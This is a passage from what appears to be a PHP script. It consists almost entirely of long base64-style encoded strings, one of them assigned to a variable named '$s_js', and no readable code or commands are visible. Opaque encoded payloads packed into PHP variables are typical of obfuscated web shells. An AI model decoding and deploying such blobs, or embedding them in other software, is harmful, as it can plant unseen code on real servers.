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";
$s_js = "7Vvnl9tGkv88fs//A6y7XZILagAwUyPKxwDmnEmtVg+hEUgkIhAAd/W/XzcAgmE4ku3zvrsPJ0szRHd1VXX1r1KD/virIRk//yQBhgdm8l1d12yg2e/nvgE+YDbwbGLHHBmLM2XDfpd6+fkn4m+YZNvGB4JwXfd5b/q6CDTZe9ZNkeB0HhCsqbsWMAlLN22bYRVAYO+xGXyYowcsyaWwme0wpo31GU00ZV4E2N+In3/6T+srWoKIvu4srIK9Oy4lmy1bOfqYA50xUSPXiyG93SojnCqPhmNuMxys2XabL4pNNtvOu9lOT2aaarff38+01WlUWuNEa9stlMjjqghamUlrhJ/m44bknUa7UT6fVVRXLjSzvp9vlce+5bd7CujWOrbR3uFzfdmz8jMl4+Xah8x6oKya/aw8m4209pwkHEKusaAt8OZe3J/KuDZz2Oy43T7KNV6dyAQ5nRXye7U0l1nKsb3D2Oj3Gp6w3nW9fDlPH7dF9rAczvOaWCKc+Vqcr422cQKNVrFUzgDT6JvHudB0B0duSzR5iRwWvPoxIw80lSjqotYUun1X57pNwW2wtCtluVpL7NRtl66W+zalsrzIyyu636eK1nZo1OmGXh/1mvleu3Gk5+pie6huHbq6ZjZ66+DViiV8XaD2LTMPPFrTuR0xbuumwdGbUtHijc56SPUBv+1L9FBytt5alstKrc6YxoAuLmmi6om63SMJy2tMcwuW5rL8YrZyKEqb+ZNpoT7vKZbMDa3RYSiKmjVe+oY48YwBaA/yjbVe3ki7lS2Ck0667HwwojLUxmfXnF0+uK3udDJg5ZKs5g41nlLV/bib542TP2I8bz/k1Ny82puP+pnTcDNSD61svW6z+90xo+dW0rw3m2kCO2gqanuq24dRdSj49YnROpi2c9iOMuNes70qnhxndjCUpZCZlQ1JJfdK5sR1F/5p4a/5HiCIbXlHeAWvbbflLMgW1e2R80/4cDLQZ8xOrWUbrLxsO1RG4zvZ9oBd5EhDLZG55ii7cnFubSgL+XTICKpnro9Z1uTqlHkYSBvScXvGcVCsr+q9cXOEK0zrtNoX3BZe0pmdl53IU37ZB325UCMppVXrS8Zh2JKd9aaVqZn6zi/0vaHWzG7WvdysbzVsXqF5NkPocm6Z6bdERynVB86Ka2fNo+kRgtR3iqXOxpuXWkV5MyFcvS0smjl9Oc9n1dmuNMpMCqK6rpbo07G3Xe0PpXyJIIRebcSTZK/JkHiRI/rHMk5s9IJ3rPG1U1OWBof9vksdDba8zwvlU6O21vCS4I09v7HlSCCe1MUiV6yZDc9tjLfcKmeN2qU+u8nxojdwJbY5z7dHqtLLFxrdKX5aDPt0n+FLItPJrQYNY1gaCQ1JNOZtt74tc1MDZ3jBHxu4rOFTjbZremvr6MJmzDdr866fXQ83tE0XirOtXfR7zdGxumwp2RXYZmdLwe7hx0ZW5ccbXa/zQr9t9jym0+6X2XwGFJe6VQZ9VqTWWRmUSH7Q3M9W6tBZLrYkodJZw2lyCi159bZRIje+3wZNoTbv2StlogwKHify7cUgP2da8z0tdWkvwzY3bK4w6oAZv3JblNjnm61llSGplmguhw1mmyEXGq5UmcGwNGSL/EbNyUKt0GJxvEa4ZU+fTdyZwLTXNLe3WOk0Hmn8SgcLQvJm7HHXX9i1oTQtV5tEwW/w3smoGzI5HlHtDiWadqs93BZdi5pm3VppJ3eA1dIbdNfQ66WO112JGZ+asjhgwdCuMbK5KObzsmI2qwa+kDKraq9IGzWFXLmqOOiqvb1W0qmdvx9vWkaPLg0seeluN2Kz0xvvBju2lx1NT0TGKFheboRz1hp3hGVjfJDypXJhTPllsVmfzIrrEVnWT0Rtnl9nlk1605lb1e1CLxWqJi1qJ9cvWd3axGtO6vje7ffmXfcwznZn+WF+J+e0leYJYDXTGlwfJ7pdhpUsOZOhdpn5iQdqy/StOrmjrL1XoPtr0xsvM/bSqo7zlNPcH8tWeSnOabk5W/ZWYhGGoXxr6q3MWnebUfEi0Aq8pHWAQTQy6+GU2YP1usXP6qtRmV/WN5n8yGpSmwGOt715uVsUiZxdk2giz6135WabrMuDsUgJ0+yk5+wOI2PrjjqSt7OXNbLu09PTTDX43bK1zPXBaNdQBwc8Xy37Y5fqt7tdc7I85IuLkrnf7o6Ssfa9tpP1QWc3YNXtaebIp3W7tDAFczUskJlMY20d4cEIpgTqTqnfYUe5/i6jN+Xjvrhw+v6x1Dc3vSFeoHpKadRfMTbtaGUNEK3+dLnIOvi40G/Ul5PehC2PM/slkHmgk+A0ofZ2tr3vj06zsdu31BxnKrhjHfj5qdxQwDy7zbA7brAQZ1qZHHG833RmLam6rS1Oem4y1zuLmrmXpPVaG4PGZmQpozyztNwd4yiHQW1t75alsUdY/a4ISbZEdgr6c0qXKNvR+wt6bI97a5Jcgna/tcwwlLMaSOpKmdWb/fWQESZbdtCaH8pdri1ZtdyoPK/vGwcaViYCsCR+Zs77uRk1BStjtVoUZzV3Jrs1i+zaomv6eHnXZbzBepxfmm3/OJN31DE3WgsdsJ4eWHEzywvgMFlbk9WQ6ZPixhSARtO9odEiqbwzz80m1W7+OB6Pd3ORrA+gW5q1DDvYDY1uU6Y5g86Wx2bRaXp0tzPKlMkcUWu3exy+wevlo1PFV6NhZo53MlN8ufcX6rjDTJo2fdD5/DBbM4XhmD85O5ho1M4uuwEDqdxdMTgz4XudNiXmcaVEE5vTqtPh9IW/z+aFqecpALqY0cjPvXaH1jt0lm3WD47OMvh4580a0wxdkleFolufWht9oFt6vVsiaKp2svsFWLLgx+OyNSFOctmtGyNlml1tjM5uPaULu8lpOxsyB8exSoMFdK353htLXbW/V/dcDmwG9tEc9rTuiVzZpkk3dweCyS7Hc3Jjl2arWW23Fno2sIf+1rJ6JXfZk6wyUyqtsi2xNpydtKF8HEk6rtJdXdLEYqkwwZmy2iVzORGoxZpXm6jzmjPY6ic+px17rHOc2EwmU54uc3Z3UZ47quurRRNnfa558pvT8bLQBtV1qbTOdClSFkeF7LruV3dLRhguszWaWPKK1wD53pSsybqXdfRj4VCoZnICWxKq5iB/GoxyVjXbmhzcYhYfzeWZS+93HqPMJsrYVWhZPAytst4VcOPYye02uQPjkNOS3pUVbjpZ7TaEubCOHcPqtTSjMC4fCy15rfKbhskW8PmmX2rZVEcvV8XRyBcXtEhmFNeduNxB7W3K7malNSeb5nAIyFZWI1dSnjzs1QI/cXBvP6OE+orNjNfsrDzvTcB8NDeNfM8V5o6/ZBe1trgcme6ccBeVd5fS3IK1uSjbksM+c7pK8IAneF01YYXvw0o8/ogK8YZj2bKGNWTmdK7Bz/NRDb5cdoewBoe5mzTlSaFV